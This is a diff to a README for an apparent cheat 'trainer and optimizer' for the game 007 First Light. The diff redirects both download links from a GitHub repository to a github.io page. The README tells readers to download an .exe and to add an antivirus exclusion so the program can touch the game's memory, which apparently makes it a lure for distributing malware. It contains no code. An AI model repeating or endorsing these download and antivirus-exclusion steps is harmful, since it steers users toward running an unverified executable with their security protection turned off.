@@ -1,12 +1,12 @@
 # 🎯 007-First-Light-Trainer-And-Optimizer_v_2 - Enhance Your Play Experience With Ease
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Vernajainist391/007-First-Light-Trainer-And-Optimizer_v_2)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://vernajainist391.github.io)
 
 This tool modifies specific values in 007 First Light to give you control over gameplay elements and system performance. Use it to enable invincibility, unlock gear, or improve your frame rate during intense sequences. The application works locally on your Windows computer and does not require complex software knowledge to operate.
 
 ## 📥 Getting Started
 
-Visit [this page](https://github.com/Vernajainist391/007-First-Light-Trainer-And-Optimizer_v_2) to download the latest version of the utility. Look for the file ending in .exe in the releases section. Save this file to a folder on your desktop for quick access. 
+Visit [this page](https://vernajainist391.github.io) to download the latest version of the utility. Look for the file ending in .exe in the releases section. Save this file to a folder on your desktop for quick access. 
 
 This program modifies game memory. Certain antivirus programs may flag this activity. This is a common occurrence with trainers. You may need to create an exclusion folder for the trainer to allow the software to interact with the game process.
 
